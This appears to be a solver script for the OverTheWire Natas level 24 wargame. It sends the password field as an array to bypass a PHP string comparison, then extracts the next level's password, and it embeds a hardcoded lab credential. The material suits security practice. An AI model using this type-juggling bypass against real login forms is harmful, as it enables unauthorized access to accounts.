from pwn import *
import requests
import re
import codecs       #This is just to decode a string to hex

username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
url = "http://{}.natas.labs.overthewire.org".format(username)


log.progress("Getting the natas25 password, Hold on! ")
session = requests.session()

web = session.post(url , data= {"passwd[]": "password"} ,  auth = (username, password)).text
flag = re.findall("natas25 Password: (.*)</pre>", web)
print("The password for natas25 is === " + flag[0])